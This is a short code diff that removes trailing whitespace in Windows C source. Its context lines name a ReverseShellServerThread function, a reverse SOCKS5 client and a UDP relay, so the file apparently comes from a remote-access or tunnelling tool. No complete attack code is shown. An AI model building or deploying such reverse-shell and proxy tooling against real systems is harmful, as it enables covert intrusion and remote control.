@@ -279,7 +279,7 @@ DWORD WINAPI ReverseShellServerThread(LPVOID param) {
     return 0;
 }
 
-// Reverse SOCKS5 Client 
+// Reverse SOCKS5 Client
 #define SOCKS5_VERSION          0x05
 #define AUTH_METHOD_NO_AUTH     0x00
 #define AUTH_METHOD_USERPASS    0x02
@@ -495,7 +495,7 @@ static DWORD WINAPI UDPRelayThread(LPVOID param) {
             if (getaddrinfo(domain, NULL, &hints, &res) || !res) continue;
 
             memcpy(&dest_addr, res->ai_addr, res->ai_addrlen);
-            dest_addr_len = (int)res->ai_addrlen; 
+            dest_addr_len = (int)res->ai_addrlen;
             freeaddrinfo(res);
 
             if (dest_addr.ss_family == AF_INET)
